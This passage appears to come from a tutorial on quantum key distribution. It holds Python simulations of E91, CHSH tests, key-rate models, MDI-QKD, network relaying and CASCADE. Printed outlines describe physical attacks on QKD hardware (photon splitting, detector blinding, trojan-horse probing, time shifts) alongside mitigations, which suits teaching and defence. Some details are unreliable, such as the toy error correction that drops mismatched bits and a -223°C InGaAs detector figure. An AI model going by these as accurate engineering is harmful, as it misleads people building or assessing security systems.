            print(f"[INFO] Quantum limit: S ≤ {2*sqrt(2):.3f}")
            
            if S > 2.0:
                print("[SUCCESS] Bell inequality violated - quantum correlations confirmed!")
                print("[SUCCESS] No eavesdropping detected")
                return True
            else:
                print("[WARNING] Bell inequality NOT violated")
                print("[WARNING] Possible eavesdropping or measurement errors")
                return False
        else:
            print("[WARNING] Insufficient data for Bell test")
            return False
    
    def sift_key(self):
        """
        Step 5: Key sifting - keep bits where Alice and Bob used compatible bases
        
        For key generation, use measurements where:
        - Alice used basis a2 (45°) and Bob used basis b1 (45°) - same angle
        - Alice used basis a3 (90°) and Bob used basis b2 (90°) - same angle
        """
        print("\n[PUBLIC] Performing key sifting...")
        
        sifted_key_alice = []
        sifted_key_bob = []
        
        compatible_pairs = 0
        
        for i in range(len(self.alice_bases)):
            # Check for compatible basis pairs
            alice_b = self.alice_bases[i]
            bob_b = self.bob_bases[i]
            
            # Compatible: a2(45°) with b1(45°), or a3(90°) with b2(90°)
            if (alice_b == 1 and bob_b == 0) or (alice_b == 2 and bob_b == 1):
                sifted_key_alice.append(self.alice_measurements[i])
                sifted_key_bob.append(self.bob_measurements[i])
                compatible_pairs += 1
        
        print(f"[INFO] Compatible measurements: {compatible_pairs}/{len(self.alice_bases)}")
        print(f"[INFO] Sifted key length: {len(sifted_key_alice)} bits")
        
        return sifted_key_alice, sifted_key_bob
    
    def error_correction(self, key_alice, key_bob):
        """
        Step 6: Error correction and privacy amplification
        """
        print("\n[INFO] Performing error correction...")
        
        # Calculate error rate
        errors = sum(1 for a, b in zip(key_alice, key_bob) if a != b)
        error_rate = errors / len(key_alice) if key_alice else 0
        
        print(f"[INFO] Errors: {errors}/{len(key_alice)} ({error_rate*100:.2f}%)")
        
        if error_rate > 0.11:
            print("[WARNING] High error rate - aborting")
            return None
        
        # Simple error correction (CASCADE or similar in practice)
        corrected_key = [a for a, b in zip(key_alice, key_bob) if a == b]
        
        print(f"[INFO] Corrected key length: {len(corrected_key)} bits")
        
        return corrected_key
    
    def run_protocol(self):
        """Execute complete E91 protocol"""
        print("="*60)
        print("E91 QUANTUM KEY DISTRIBUTION PROTOCOL")
        print("="*60)
        
        self.generate_entangled_pairs()
        self.alice_measure()
        self.bob_measure()
        
        # Test for eavesdropping via Bell inequality
        if self.test_bell_inequality():
            # Proceed with key generation
            key_alice, key_bob = self.sift_key()
            
            if key_alice:
                final_key = self.error_correction(key_alice, key_bob)
                
                if final_key:
                    print(f"\n[SUCCESS] Shared secret key established!")
                    print(f"[KEY] {final_key[:20]}... ({len(final_key)} bits)")
                    return final_key
        
        print("\n[ABORT] Protocol failed")
        return None

# Run E91 protocol simulation
e91 = E91Protocol(key_length=300)
key = e91.run_protocol()
```

**Bell State Verification:**

```python
def demonstrate_bell_states():
    """
    Demonstrate the four Bell states and their properties
    """
    print("Bell States (EPR Pairs)")
    print("=" * 60)
    
    bell_states = {
        'Φ+': '(|00⟩ + |11⟩)/√2  - Maximally entangled, even parity',
        'Φ-': '(|00⟩ - |11⟩)/√2  - Maximally entangled, even parity',
        'Ψ+': '(|01⟩ + |10⟩)/√2  - Maximally entangled, odd parity',
        'Ψ-': '(|01⟩ - |10⟩)/√2  - Maximally entangled, odd parity'
    }
    
    for state, description in bell_states.items():
        print(f"\n|{state}⟩ = {description}")
    
    print("\n" + "=" * 60)
    print("Properties:")
    print("- Perfect correlation when measured in same basis")
    print("- Violate Bell inequalities (S > 2)")
    print("- Cannot be described by local hidden variables")
    print("- Instantaneous correlation (quantum non-locality)")

demonstrate_bell_states()
```

**CHSH Inequality Calculator:**

```python
def calculate_chsh_inequality(measurements):
    """
    Calculate CHSH inequality from measurement data
    
    Input: measurements = {
        (alice_angle, bob_angle): [correlation_values]
    }
    """
    def expectation_value(correlations):
        """Calculate E(a,b) = ⟨AB⟩"""
        if not correlations:
            return 0
        return sum(correlations) / len(correlations)
    
    # CHSH uses four angle combinations
    # Optimal quantum angles: 0°, 45°, 22.5°, 67.5°
    
    print("CHSH Inequality Calculation")
    print("=" * 60)
    
    # Example measurement data
    E_a1b1 = expectation_value(measurements.get((0, 22.5), []))
    E_a1b2 = expectation_value(measurements.get((0, 67.5), []))
    E_a2b1 = expectation_value(measurements.get((45, 22.5), []))
    E_a2b2 = expectation_value(measurements.get((45, 67.5), []))
    
    print(f"E(a1, b1) = {E_a1b1:.3f}")
    print(f"E(a1, b2) = {E_a1b2:.3f}")
    print(f"E(a2, b1) = {E_a2b1:.3f}")
    print(f"E(a2, b2) = {E_a2b2:.3f}")
    
    S = abs(E_a1b1 + E_a1b2 + E_a2b1 - E_a2b2)
    
    print(f"\nS = |E(a1,b1) + E(a1,b2) + E(a2,b1) - E(a2,b2)|")
    print(f"S = {S:.3f}")
    print(f"\nClassical bound: S ≤ 2.000")
    print(f"Quantum bound: S ≤ {2*sqrt(2):.3f}")
    print(f"Tsirelson's bound: S ≤ {2*sqrt(2):.3f}")
    
    if S > 2.0:
        violation = S - 2.0
        significance = (S / (2*sqrt(2))) * 100
        
        print(f"\n[RESULT] Bell inequality VIOLATED!")
        print(f"  Violation: {violation:.3f} above classical limit")
        print(f"  Quantum efficiency: {significance:.1f}%")
        print(f"  Interpretation: Quantum correlations confirmed")
        print(f"  Security: No local hidden variable eavesdropper")
        return True
    else:
        print(f"\n[RESULT] Bell inequality NOT violated")
        print(f"  Within classical bound")
        print(f"  Possible eavesdropping or detector inefficiency")
        return False

# Example usage with simulated data
example_measurements = {
    (0, 22.5): [1, 1, 1, -1, 1, 1, -1, 1],
    (0, 67.5): [1, -1, 1, 1, -1, 1, 1, -1],
    (45, 22.5): [1, 1, -1, 1, 1, -1, 1, 1],
    (45, 67.5): [-1, -1, 1, -1, -1, 1, -1, 1]
}

calculate_chsh_inequality(example_measurements)
```

**E91 vs BB84 Comparison:**

```python
def compare_qkd_protocols():
    """
    Compare BB84 and E91 protocols
    """
    print("\nQKD Protocol Comparison: BB84 vs E91")
    print("=" * 80)
    
    comparison = {
        'Resource': {
            'BB84': 'Single photon source',
            'E91': 'Entangled photon pair source'
        },
        'Bases': {
            'BB84': '2 bases (rectilinear, diagonal)',
            'E91': '3 bases per party (6 total angles)'
        },
        'Key Rate': {
            'BB84': '~50% after basis reconciliation',
            'E91': '~33% after basis sifting'
        },
        'Eavesdropping Detection': {
            'BB84': 'QBER monitoring',
            'E91': 'Bell inequality violation + QBER'
        },
        'Security Proof': {
            'BB84': 'No-cloning theorem, measurement disturbance',
            'E91': 'Bell inequality, quantum non-locality'
        },
        'Implementation Complexity': {
            'BB84': 'Moderate (single photon generation)',
            'E91': 'High (entangled pair generation and synchronization)'
        },
        'Distance': {
            'BB84': 'Limited by photon loss (~100-300 km fiber)',
            'E91': 'Similar limits, but enables quantum repeaters'
        },
        'Practical Deployment': {
            'BB84': 'Widely deployed (commercial systems available)',
            'E91': 'Experimental/research implementations'
        }
    }
    
    for category, protocols in comparison.items():
        print(f"\n{category}:")
        print(f"  BB84: {protocols['BB84']}")
        print(f"  E91:  {protocols['E91']}")
    
    print("\n" + "=" * 80)
    print("Conclusion:")
    print("  BB84: Practical, widely deployed, easier implementation")
    print("  E91: Stronger theoretical foundation, enables quantum networks")

compare_qkd_protocols()
```

### Practical Implementations

Practical QKD implementations face numerous challenges beyond theoretical protocol design. Real-world systems must address photon loss, detector inefficiencies, environmental noise, and physical security of quantum channels.

**Commercial QKD Systems:**

```bash
# QKD System Architecture Overview
cat > qkd_architecture.txt << 'EOF'
┌─────────────────────────────────────────────────────────────┐
│                    QKD System Components                     │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ALICE (Transmitter)          QUANTUM CHANNEL        BOB (Receiver)
│  ┌──────────────┐                                   ┌──────────────┐
│  │ Laser Source │───┐                          ┌───│ Detectors    │
│  │ (Attenuated) │   │                          │   │ (SPADs/APDs) │
│  └──────────────┘   │                          │   └──────────────┘
│                     │                          │                   
│  ┌──────────────┐   │    ┌──────────────┐     │   ┌──────────────┐
│  │ Phase/Pol    │───┼───│ Optical Fiber │────┼───│ Basis        │
│  │ Modulator    │   │    │ or Free-Space│     │   │ Selector     │
│  └──────────────┘   │    └──────────────┘     │   └──────────────┘
│                     │                          │                   
│  ┌──────────────┐   │                          │   ┌──────────────┐
│  │ Random Num   │───┘                          └───│ Timing Sync  │
│  │ Generator    │                                  │ & Detection  │
│  └──────────────┘                                  └──────────────┘
│                                                                     
│  ┌──────────────────────────────────────────────────────────┐     
│  │           Classical Channel (Authenticated)              │     
│  │  - Basis reconciliation                                  │     
│  │  - Error correction                                      │     
│  │  - Privacy amplification                                 │     
│  └──────────────────────────────────────────────────────────┘     
└─────────────────────────────────────────────────────────────┘
EOF

cat qkd_architecture.txt
```

**QKD Implementation Parameters:**

```python
class PracticalQKDParameters:
    """
    Real-world QKD system parameters and constraints
    
    [Unverified] Values are typical for commercial systems but vary by vendor
    """
    
    def __init__(self):
        # Optical parameters
        self.wavelength = 1550  # nm (telecom C-band)
        self.pulse_rate = 1e9   # 1 GHz (pulses per second)
        self.mean_photon_number = 0.1  # Weak coherent pulses
        
        # Channel parameters
        self.fiber_loss = 0.2   # dB/km (at 1550nm)
        self.detector_efficiency = 0.15  # 15% (typical SPAD)
        self.dark_count_rate = 100  # Hz per detector
        
        # Timing parameters
        self.gate_width = 1e-9  # 1 ns detection window
        self.dead_time = 50e-9  # 50 ns detector dead time
        self.jitter = 100e-12   # 100 ps timing jitter
        
        # Protocol parameters
        self.qber_threshold = 0.11  # 11% error rate limit
        self.privacy_amp_factor = 0.5  # Final key = 50% of sifted key
    
    def calculate_key_rate(self, distance_km):
        """
        Calculate expected secure key rate for given distance
        
        Simplified formula: R = f * η * μ * e^(-α*L)
        where:
        - f = pulse repetition rate
        - η = detector efficiency
        - μ = mean photon number
        - α = fiber loss coefficient
        - L = distance
        """
        import math
        
        # Total loss in dB
        total_loss_db = self.fiber_loss * distance_km
        
        # Convert to linear scale
        transmission = 10 ** (-total_loss_db / 10)
        
        # Detection probability
        detection_prob = transmission * self.detector_efficiency
        
        # Raw key rate (before error correction)
        raw_rate = self.pulse_rate * detection_prob * self.mean_photon_number
        
        # Account for basis reconciliation (50% for BB84)
        sifted_rate = raw_rate * 0.5
        
        # Account for error correction and privacy amplification
        secure_rate = sifted_rate * self.privacy_amp_factor
        
        print(f"\nKey Rate Calculation for {distance_km} km")
        print("=" * 60)
        print(f"Fiber loss: {total_loss_db:.1f} dB")
        print(f"Transmission: {transmission:.2e}")
        print(f"Detection probability: {detection_prob:.2e}")
        print(f"Raw detection rate: {raw_rate:.2e} Hz")
        print(f"Sifted key rate: {sifted_rate:.2e} bps")
        print(f"Secure key rate: {secure_rate:.2e} bps ({secure_rate:.1f} bps)")
        
        # Practical interpretation
        if secure_rate > 1000:
            print(f"[INFO] {secure_rate/1000:.1f} kbps - Practical for key refresh")
        elif secure_rate > 10:
            print(f"[INFO] {secure_rate:.1f} bps - Marginal, slow key generation")
        else:
            print(f"[WARNING] {secure_rate:.2f} bps - Impractical")
        
        return secure_rate
    
    def calculate_maximum_distance(self, min_key_rate=10):
        """
        Calculate maximum practical distance for minimum key rate
        """
        import math
        
        # Solve for distance where secure_rate = min_key_rate
        # This requires iterative solving
        
        for distance in range(10, 500, 10):
            rate = self.calculate_key_rate(distance)
            if rate < min_key_rate:
                print(f"\n[RESULT] Maximum distance: ~{distance-10} km")
                print(f"         (for minimum {min_key_rate} bps secure key rate)")
                return distance - 10
        
        return 500

# Example calculations
qkd_params = PracticalQKDParameters()

print("Practical QKD System Analysis")
print("=" * 60)

# Calculate key rates at various distances
for distance in [10, 50, 100, 150, 200]:
    qkd_params.calculate_key_rate(distance)

# Find maximum practical distance
qkd_params.calculate_maximum_distance(min_key_rate=100)
```

**Detector Types and Characteristics:**

```python
def compare_qkd_detectors():
    """
    Compare quantum detectors used in QKD systems
    """
    print("\nQKD Detector Technologies")
    print("=" * 80)
    
    detectors = {
        'SPAD (Silicon)': {
            'efficiency': '15-70%',
            'dark_count': '10-1000 Hz',
            'jitter': '50-500 ps',
            'wavelength': '400-1000 nm',
            'temperature': 'Room temp or cooled',
            'cost': 'Low-Medium',
            'use_case': 'Free-space QKD, short-distance fiber'
        },
        'InGaAs APD': {
            'efficiency': '10-25%',
            'dark_count': '1e3-1e6 Hz',
            'jitter': '100-500 ps',
            'wavelength': '900-1700 nm',
            'temperature': 'Cryogenic (-223°C)',
            'cost': 'Medium-High',
            'use_case': 'Fiber QKD (telecom wavelengths)'
        },
        'Superconducting Nanowire (SNSPD)': {
            'efficiency': '80-98%',
            'dark_count': '< 1 Hz',
            'jitter': '20-100 ps',
            'wavelength': '400-2000 nm',
            'temperature': 'Cryogenic (~2-4 K)',
            'cost': 'Very High',
            'use_case': 'Research, long-distance QKD'
        },
        'Transition Edge Sensor (TES)': {
            'efficiency': '95%+',
            'dark_count': '< 0.1 Hz',
            'jitter': '< 10 ps',
            'wavelength': 'Broadband',
            'temperature': 'Ultra-cryogenic (< 1 K)',
            'cost': 'Very High',
            'use_case': 'Research, photon-number resolving'
        }
    }
    
    for detector, specs in detectors.items():
        print(f"\n{detector}:")
        for param, value in specs.items():
            print(f"  {param.replace('_', ' ').title()}: {value}")
    
    print("\n" + "=" * 80)
    print("Selection Criteria:")
    print("  - Commercial systems: InGaAs APD (1550nm fiber)")
    print("  - Research/high-performance: SNSPD")
    print("  - Free-space/visible: Silicon SPAD")

compare_qkd_detectors()
```

**Attack Vectors on Practical QKD:**

```python
class PracticalQKDAttacks:
    """
    Practical attacks on real-world QKD implementations
    
    [Unverified] These attacks exploit implementation flaws, not protocol weaknesses
    """
    
    @staticmethod
    def photon_number_splitting_attack():
        """
        PNS attack exploits multi-photon pulses in weak coherent state QKD
        """
        print("\n1. PHOTON NUMBER SPLITTING (PNS) ATTACK")
        print("=" * 60)
        print("Exploit: Weak coherent pulses occasionally contain >1 photon")
        print("Attack:")
        print("  1. Eve splits off one photon from multi-photon pulses")
        print("  2. Remaining photon(s) continue to Bob")
        print("  3. Eve stores her photons until basis announcement")
        print("  4. Eve measures in correct basis, learns key bits")
        print("\nDetection: Difficult - no increase in QBER")
        print("Mitigation:")
        print("  - Decoy states (varying intensity)")
        print("  - True single-photon sources")
        print("  - Lower mean photon number (reduces multi-photon rate)")
        
        # Calculate multi-photon probability
        import math
        mu = 0.1  # Mean photon number
        
        # Poisson distribution
        p0 = math.exp(-mu)  # Vacuum
        p1 = mu * math.exp(-mu)  # Single photon
        p_multi = 1 - p0 - p1  # Multiple photons
        
        print(f"\nExample with μ = {mu}:")
        print(f"  Vacuum probability: {p0*100:.2f}%")
        print(f"  Single photon: {p1*100:.2f}%")
        print(f"  Multi-photon: {p_multi*100:.2f}%")
        print(f"  PNS vulnerability: {p_multi*100:.2f}% of pulses")
    
    @staticmethod
    def detector_blinding_attack():
        """
        Blind detectors with bright light, then control their response
        """
        print("\n2. DETECTOR BLINDING ATTACK")
        print("=" * 60)
        print("Exploit: APDs can be forced into linear mode with bright light")
        print("Attack:")
        print("  1. Eve sends bright continuous-wave light to Bob")
        print("  2. Bob's APDs transition from Geiger to linear mode")
        print("  3. Eve sends fake quantum signals (classical pulses)")
        print("  4. Detectors respond deterministically to Eve's signals")
        print("  5. Eve controls Bob's measurement outcomes")
        print("\nDetection:")
        print("  - Monitor detector operating mode")
        print("  - Check for unexpected photocurrent")
        print("  - Measure bright illumination before signal")
        print("\nMitigation:")
        print("  - Optical isolators")
        print("  - Power monitors on detector inputs")
        print("  - Randomized detector gating")
        print("  - Detector self-testing")
    
    @staticmethod
    def trojan_horse_attack():
        """
        Probe Alice's/Bob's devices by sending light back
        """
        print("\n3. TROJAN HORSE ATTACK")
        print("=" * 60)
        print("Exploit: Imperfect optical isolation allows back-reflection")
        print("Attack:")
        print("  1. Eve sends probe pulses into Alice's transmitter")
        print("  2. Probe light reflects from Alice's modulator")
        print("  3. Reflection encodes Alice's bit/basis choice")
        print("  4. Eve measures reflected light, learns Alice's settings")
        print("\nVariants:")
        print("  - Wavelength attack (use non-QKD wavelength)")
        print("  - Timing attack (probe at specific times)")
        print("  - Power analysis (measure reflected power)")
        print("\nMitigation:")
        print("  - Optical isolators (>80 dB isolation)")
        print("  - Wavelength filtering")
        print("  - Monitor for unexpected light")
        print("  - Asymmetric schemes (minimize reflections)")
    
    @staticmethod
    def time_shift_attack():
        """
        Exploit timing side-channels in detector gating
        """
        print("\n4. TIME-SHIFT ATTACK")
        print("=" * 60)
        print("Exploit: Imperfect timing synchronization")
        print("Attack:")
        print("  1. Eve delays photons by controlled amount")
        print("  2. Shifted photons arrive outside normal detection window")
        print("  3. Eve selectively delivers photons based on basis")
        print("  4. Creates false basis-dependent detection patterns")
        print("\nDetection:")
        print("  - Monitor photon arrival time distribution")
        print("  - Check for unexpected delays")
        print("  - Statistical analysis of detection times")
        print("\nMitigation:")
        print("  - Tight timing gates")
        print("  - Random gate positioning")
        print("  - Time-bin encoding")
    
    @staticmethod
    def demonstrate_all_attacks():
        """Show all practical QKD attacks"""
        print("\n" + "="*60)
        print("PRACTICAL QKD IMPLEMENTATION ATTACKS")
        print("="*60)
        
        PracticalQKDAttacks.photon_number_splitting_attack()
        PracticalQKDAttacks.detector_blinding_attack()
        PracticalQKDAttacks.trojan_horse_attack()
        PracticalQKDAttacks.time_shift_attack()
        
        print("\n" + "="*60)
        print("SUMMARY")
        print("="*60)
        print("These attacks exploit IMPLEMENTATION flaws, not protocol weaknesses")
        print("Defense requires:")
        print("  1. Device characterization and monitoring")
        print("  2. Optical isolation and filtering")
        print("  3. Detector self-testing")
        print("  4. Decoy states (for PNS)")
        print("  5. Measurement-device-independent (MDI) QKD")

# Demonstrate attacks
PracticalQKDAttacks.demonstrate_all_attacks()
```

**Decoy State Protocol:**

```python
def decoy_state_qkd():
    """
    Decoy state protocol to defend against PNS attacks
    
    Alice randomly varies pulse intensity:
    - Signal states: μ (e.g., 0.5 photons)
    - Decoy states: ν (e.g., 0.1 photons)
    - Vacuum states: 0 photons
    """
    print("\nDecoy State QKD Protocol")
    print("=" * 60)
    
    import math
    
    # Parameters
    mu_signal = 0.5  # Signal intensity
    nu_decoy = 0.1   # Decoy intensity
    p_signal = 0.7   # Probability of signal
    p_decoy = 0.2    # Probability of decoy
    p_vacuum = 0.1   # Probability of vacuum
    
    print(f"Signal intensity (μ): {mu_signal}")
    print(f"Decoy intensity (ν): {nu_decoy}")
    print(f"Probabilities: {p_signal:.0%} signal, {p_decoy:.0%} decoy, {p_vacuum:.0%} vacuum")
    
    # Calculate single-photon contributions
    def photon_prob(mu, n):
        """Poisson distribution for n photons"""
        return (mu**n / math.factorial(n)) * math.exp(-mu)
    
    print("\nPhoton Number Statistics:")
    print("-" * 60)
    
    for intensity, name in [(mu_signal, "Signal"), (nu_decoy, "Decoy")]:
        p0 = photon_prob(intensity, 0)
        p1 = photon_prob(intensity, 1)
        p2 = photon_prob(intensity, 2)
        p_multi = 1 - p0 - p1
        
        print(f"\n{name} (μ={intensity}):")
        print(f"  0 photons: {p0*100:.2f}%")
        print(f"  1 photon:  {p1*100:.2f}%")
        print(f"  2 photons: {p2*100:.2f}%")
        print(f"  Multi:     {p_multi*100:.2f}%")
    
    print("\n" + "=" * 60)
    print("Security Analysis:")
    print("  - Compare gain (detection rate) for signal vs decoy")
    print("  - Estimate single-photon contribution")
    print("  - Detect PNS attack if decoy gain is anomalous")
    print("  - Secure key rate depends on single-photon detection")
    
    print("\nProtocol Steps:")
    print("  1. Alice randomly sends signal/decoy/vacuum states")
    print("  2. Bob measures as normal (doesn't know state type)")
    print("  3. After measurement, Alice announces state types")
    print("  4. Analyze detection statistics per state type")
    print("  5. Estimate single-photon secure key rate")
    print("  6. Detect anomalies indicating PNS attack")

decoy_state_qkd()
```

**Measurement-Device-Independent (MDI) QKD:**

```python
def mdi_qkd_protocol():
    """
    MDI-QKD removes all detector-based attacks
    
    Key idea: Untrusted relay (Charlie) performs Bell state measurement
    Alice and Bob never detect photons themselves
    """
    print("\nMeasurement-Device-Independent (MDI) QKD")
    print("=" * 60)
    
    print("\nArchitecture:")
    print("""
    Alice                Charlie (Untrusted)               Bob
    ┌─────┐              ┌──────────────┐              ┌─────┐
    │     │─── Photon ──│              │── Photon ───│     │
    │ TX  │             │ Bell State   │              │ TX  │
    │     │─── Photon ──│ Measurement  │── Photon ───│     │
    └─────┘              └──────────────┘              └─────┘
                                │
                         Announces results
                         (which Bell state)
    """)
    
    print("\nProtocol Steps:")
    print("  1. Alice prepares qubit in random BB84 state")
    print("  2. Bob prepares qubit in random BB84 state")
    print("  3. Both send their photons to Charlie")
    print("  4. Charlie performs Bell state measurement")
    print("  5. Charlie announces measurement result publicly")
    print("  6. Alice and Bob use results to establish shared key")
    
    print("\nSecurity:")
    print("  - Charlie's detectors can be compromised - doesn't matter!")
    print("  - Even if Charlie is Eve, cannot learn key")
    print("  - Security depends only on photon sources")
    print("  - Eliminates ALL detector-based attacks")
    
    print("\nTradeoffs:")
    print("  + Immune to detector attacks")
    print("  + Enables quantum repeaters")
    print("  + Practical for quantum networks")
    print("  - Lower key rate (~1/4 of BB84)")
    print("  - Requires phase/timing stabilization")
    print("  - More complex implementation")
    
    print("\nApplications:")
    print("  - Quantum networks with untrusted nodes")
    print("  - Long-distance QKD with repeaters")
    print("  - Multi-party quantum communication")

mdi_qkd_protocol()
```

**QKD Testing and Certification:**

```bash
# QKD System Testing Checklist
cat > qkd_testing.txt << 'EOF'
QKD SYSTEM SECURITY TESTING CHECKLIST
=====================================

1. OPTICAL CHANNEL SECURITY
   □ Optical isolation measurements (>80 dB)
   □ Back-reflection monitoring
   □ Wavelength filtering verification
   □ Fiber tap detection
   □ Free-space beam security (divergence, encryption)

2. DETECTOR CHARACTERIZATION
   □ Efficiency calibration
   □ Dark count rate measurement
   □ Timing jitter characterization
   □ After-pulsing analysis
   □ Detector blinding tests
   □ Operating mode verification

3. TIMING AND SYNCHRONIZATION
   □ Clock stability testing
   □ Jitter measurements
   □ Gate positioning accuracy
   □ Time-stamp integrity
   □ Synchronization loss handling

4. QUANTUM BIT ERROR RATE (QBER)
   □ Baseline QBER measurement
   □ QBER stability over time
   □ Basis-dependent QBER analysis
   □ Environmental sensitivity
   □ Attack simulation (PNS, detector blinding)

5. CLASSICAL CHANNEL SECURITY
   □ Authentication protocol verification
   □ Error correction security
   □ Privacy amplification validation
   □ Man-in-the-middle resistance
   □ Classical channel encryption

6. SIDE-CHANNEL ANALYSIS
   □ Power consumption monitoring
   □ Electromagnetic emissions
   □ Timing side-channels
   □ Optical side-channels (trojan horse)
   □ Environmental sensors (temperature, vibration)

7. KEY GENERATION PERFORMANCE
   □ Raw key rate measurement
   □ Sifted key rate
   □ Secure key rate calculation
   □ Distance-dependent performance
   □ Long-term stability

8. FAULT INJECTION TESTING
   □ Detector saturation
   □ Bright illumination attacks
   □ Timing manipulation
   □ Power supply attacks
   □ Environmental stress testing

9. CERTIFICATION STANDARDS
   □ ETSI (European Telecommunications Standards Institute)
   □ ITU-T (International Telecommunication Union)
   □ ISO/IEC security standards
   □ National security certifications
   □ Common Criteria evaluation

10. DOCUMENTATION
    □ Security analysis report
    □ Threat model documentation
    □ Operational procedures
    □ Incident response plan
    □ Maintenance and calibration logs
EOF

cat qkd_testing.txt
```

**QKD Network Simulation:**

```python
import random
import math

class QKDNetwork:
    """
    Simulate a multi-node QKD network
    """
    
    def __init__(self):
        self.nodes = {}
        self.links = {}
        self.keys = {}
    
    def add_node(self, node_id, position=(0, 0)):
        """Add node to network"""
        self.nodes[node_id] = {
            'position': position,
            'connected_to': []
        }
        print(f"[+] Added node {node_id} at {position}")
    
    def add_link(self, node1, node2, channel_type='fiber'):
        """Add QKD link between nodes"""
        if node1 not in self.nodes or node2 not in self.nodes:
            print(f"[-] Error: Nodes must exist")
            return
        
        # Calculate distance
        pos1 = self.nodes[node1]['position']
        pos2 = self.nodes[node2]['position']
        distance = math.sqrt((pos1[0]-pos2[0])**2 + (pos1[1]-pos2[1])**2)
        
        link_id = f"{node1}-{node2}"
        self.links[link_id] = {
            'nodes': (node1, node2),
            'distance': distance,
            'type': channel_type,
            'key_rate': self.calculate_key_rate(distance, channel_type)
        }
        
        self.nodes[node1]['connected_to'].append(node2)
        self.nodes[node2]['connected_to'].append(node1)
        
        print(f"[+] Added {channel_type} link {link_id} ({distance:.1f} km, "
              f"{self.links[link_id]['key_rate']:.1f} bps)")
    
    def calculate_key_rate(self, distance, channel_type):
        """Calculate secure key rate for link"""
        if channel_type == 'fiber':
            loss_db = 0.2 * distance  # 0.2 dB/km
        elif channel_type == 'free-space':
            # Simplified free-space loss
            loss_db = 20 * math.log10(distance) + 92.45  # Very approximate
        else:
            loss_db = distance
        
        transmission = 10 ** (-loss_db / 10)
        
        # Simplified rate calculation
        pulse_rate = 1e9  # 1 GHz
        efficiency = 0.15
        rate = pulse_rate * transmission * efficiency * 0.1 * 0.5 * 0.5
        
        return max(rate, 0)
    
    def establish_path_key(self, source, destination, path=None):
        """Establish key between non-adjacent nodes via trusted repeaters"""
        if path is None:
            path = self.find_path(source, destination)
        
        if not path:
            print(f"[-] No path from {source} to {destination}")
            return None
        
        print(f"\n[*] Establishing key from {source} to {destination}")
        print(f"[*] Path: {' -> '.join(path)}")
        
        # Generate keys for each link in path
        for i in range(len(path) - 1):
            link_id = f"{path[i]}-{path[i+1]}"
            reverse_link = f"{path[i+1]}-{path[i]}"
            
            if link_id in self.links:
                key = self.generate_key(link_id)
                print(f"    [{path[i]}↔{path[i+1]}] Generated {len(key)} bit key")
            elif reverse_link in self.links:
                key = self.generate_key(reverse_link)
                print(f"    [{path[i]}↔{path[i+1]}] Generated {len(key)} bit key")
        
        print(f"[+] End-to-end key established via trusted relay")
        return True
    
    def generate_key(self, link_id):
        """Simulate key generation for a link"""
        if link_id not in self.links:
            return None
        
        # Generate random key
        key_rate = self.links[link_id]['key_rate']
        key_length = int(key_rate)  # 1 second worth
        key = [random.randint(0, 1) for _ in range(key_length)]
        
        # Store key
        self.keys[link_id] = key
        return key
    
    def find_path(self, source, destination, visited=None):
        """Find path between nodes using BFS"""
        if visited is None:
            visited = set()
        
        if source == destination:
            return [source]
        
        visited.add(source)
        
        for neighbor in self.nodes[source]['connected_to']:
            if neighbor not in visited:
                path = self.find_path(neighbor, destination, visited)
                if path:
                    return [source] + path
        
        return None
    
    def display_network(self):
        """Display network topology"""
        print("\n" + "=" * 60)
        print("QKD NETWORK TOPOLOGY")
        print("=" * 60)
        
        print(f"\nNodes: {len(self.nodes)}")
        for node_id, data in self.nodes.items():
            print(f"  {node_id}: {data['position']}, "
                  f"Connected to: {data['connected_to']}")
        
        print(f"\nLinks: {len(self.links)}")
        for link_id, data in self.links.items():
            print(f"  {link_id}: {data['distance']:.1f} km, "
                  f"{data['type']}, {data['key_rate']:.1f} bps")

# Example: Build a QKD network
network = QKDNetwork()

# Add nodes (positions in km)
network.add_node('Alice', (0, 0))
network.add_node('Bob', (50, 0))
network.add_node('Charlie', (100, 0))
network.add_node('David', (50, 50))

# Add links
network.add_link('Alice', 'Bob', 'fiber')
network.add_link('Bob', 'Charlie', 'fiber')
network.add_link('Bob', 'David', 'fiber')
network.add_link('Alice', 'David', 'free-space')

# Display network
network.display_network()

# Establish keys
network.establish_path_key('Alice', 'Charlie')
network.establish_path_key('Alice', 'David')
```

**QKD Post-Processing Tools:**

```python
class QKDPostProcessing:
    """
    QKD post-processing: error correction and privacy amplification
    """
    
    @staticmethod
    def cascade_error_correction(alice_key, bob_key, passes=4):
        """
        CASCADE error correction protocol
        
        [Inference] Simplified implementation for demonstration.
        Production systems use optimized CASCADE or LDPC codes.
        """
        print("\nCASCADE Error Correction")
        print("=" * 60)
        
        alice = list(alice_key)
        bob = list(bob_key)
        n = len(alice)
        
        # Count initial errors
        initial_errors = sum(1 for a, b in zip(alice, bob) if a != b)
        print(f"Initial errors: {initial_errors}/{n} ({initial_errors/n*100:.2f}%)")
        
        # Information leaked (for privacy amplification)
        leaked_bits = 0
        
        for pass_num in range(1, passes + 1):
            print(f"\n[PASS {pass_num}]")
            
            # Block size doubles each pass
            block_size = 2 ** (pass_num - 1) * 8
            
            # Shuffle keys (both parties use same random permutation)
            indices = list(range(n))
            random.shuffle(indices)
            
            alice_shuffled = [alice[i] for i in indices]
            bob_shuffled = [bob[i] for i in indices]
            
            # Process blocks
            blocks_corrected = 0
            for block_start in range(0, n, block_size):
                block_end = min(block_start + block_size, n)
                
                # Calculate parities
                alice_parity = sum(alice_shuffled[block_start:block_end]) % 2
                bob_parity = sum(bob_shuffled[block_start:block_end]) % 2
                
                leaked_bits += 1  # Parity announcement
                
                if alice_parity != bob_parity:
                    # Binary search for error
                    left, right = block_start, block_end - 1
                    
                    while left < right:
                        mid = (left + right) // 2
                        
                        # Ask for partial parity
                        alice_partial = sum(alice_shuffled[block_start:mid+1]) % 2
                        bob_partial = sum(bob_shuffled[block_start:mid+1]) % 2
                        
                        leaked_bits += 1
                        
                        if alice_partial != bob_partial:
                            right = mid
                        else:
                            left = mid + 1
                    
                    # Flip bit at error position
                    bob_shuffled[left] = 1 - bob_shuffled[left]
                    blocks_corrected += 1
            
            # Unshuffle
            for i, idx in enumerate(indices):
                bob[idx] = bob_shuffled[i]
            
            print(f"  Blocks corrected: {blocks_corrected}")
            print(f"  Information leaked: {leaked_bits} bits")
        
        # Count remaining errors
        final_errors = sum(1 for a, b in zip(alice, bob) if a != b)
        print(f"\n[RESULT] Remaining errors: {final_errors}/{n}")
        print(f"[RESULT] Information leaked: {leaked_bits} bits")
        
        if final_errors == 0:
            print("[SUCCESS] Keys reconciled!")
            return bob, leaked_bits
        else:
            print("[FAILED] Errors remain - additional passes needed")
            return None, leaked_bits
    
